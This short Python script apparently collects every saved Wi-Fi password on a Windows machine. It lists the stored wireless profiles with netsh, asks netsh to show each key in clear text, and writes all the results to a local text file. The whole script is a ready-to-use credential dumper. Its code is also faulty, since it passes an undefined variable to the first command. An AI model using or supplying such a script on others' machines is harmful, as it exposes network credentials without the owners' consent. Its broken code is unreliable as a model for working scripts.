#!/usr/bin/python

import subprocess
import re


command1 = "netsh wlan show profile" #Command To List The Wifi Names With Saved Passwords
networks = subprocess.check_output(command, shell=True)
network_list = re.findall('(?:Profile\s*:\s)(.*)', networks) #Regex To Grep The Names Of Wifi

final_output = ""

for network in network_list:
    command2 = "netsh wlan show profile " + network + " key=clear" #Command To Show The Keys
    one_network_result = subprocess.check_output(command2, shell=True)
    final_output += one_network_result

file = open("wifipasswords.txt",'w') #File name and "w" for writing the file
file.write(final_output)
file.close()

